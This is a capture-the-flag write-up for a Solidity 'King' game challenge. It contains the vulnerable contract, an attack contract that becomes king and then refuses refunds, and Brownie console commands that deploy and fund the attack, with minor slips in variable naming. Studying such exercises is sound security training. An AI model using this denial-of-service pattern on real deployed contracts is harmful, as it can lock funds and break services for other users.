## Exercise 9: King Game

King.sol is a simple game where "king" status is awarded to whoever sends a larger amount of ether to the contract than the current balance. When the balance updates, the previous balance is returned to the dethroned previous king. The aim of the challenge is simply to break the game by preventing any other users from becoming the king. This can be done relatively easily by making a contract that sends enough ether to the game to become the new king, but refuses to accept ether in return, thereby blocking the game.

### The vulnerable contract

```javascript

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

```


### Hack contract

```javascript

pragma solidity ^0.6.0;

contract KingHack{

    address payable owner;
    uint counter = 0;
    constructor() public {

      owner = msg.sender;
    
    }


    function get_ether() external payable onlyOwner {
        // allow payments to this function one time only
        // by requiring counter to equal 0
        require(counter==0);
        counter+=1;
        
    }

    function send_ether(address contract_address, uint amount) public {
        // send ether to the vulnerable contract
        (bool success, ) = payable(contract_address).call{value:amount}("");
        require(success,"transfer failed");
    }

    receive() external payable{
        // prevent receiving ether into this contract
        // by requiring an impossible condition
        require(false, "NO");
        }

    modifier onlyOwner(){
    require(msg.sender==owner);
    _;
    }

}

```


### Execution

The hack contract has a receive function that wil never execute because it has a `require()` statement that is impossible to satisfy. To get ether into this function, we have a `get_ether()` function that will receive ether one time only (determined using `counter`), and only from the contract owner set in the constructor. This means we can deploy the contract and fund it with a one-off transfer of ether. Then, there is a second function `send_ether` that can be used to transfer the contract balance to the King game. The deployment address for `King.sol` and the transfer amount are function arguments.

We therefore deploy this contract, fund it with some amount of ether that exceeds the current contract balance and send that balance to the king contract. The game is then broken, because if another user sends more ether to `King.sol` triggering its `receive()` function, the transfer of ether back to our contract fails and the transaction reverts.

NB: MUST fund the hack contract with balance greater than the curent balance of King.sol!!
NB: Must not use accounts.transfer() to send ETH to the hack contract - use the get_ether() func instead!
    (receive() is designed to fail!)

```bash

>>> account = accounts.load('main')
>>> king = King.at("0xd410F5Ef077279bd04a03Becd6658e8c14352ef7")
>>> king.balance()
  >>> 10000000000 # current balance
>>> hack = KingHack.deploy({'from':account}) # deploy hack contract
>>> hack.get_ether({'from':account, 'value':1100000000000000}) # fund contract
>>> hack.send_ether(contract.address,hack.balance(),{'from':account}) # send to King.sol
# King.sol now blocked with hack contract as king

```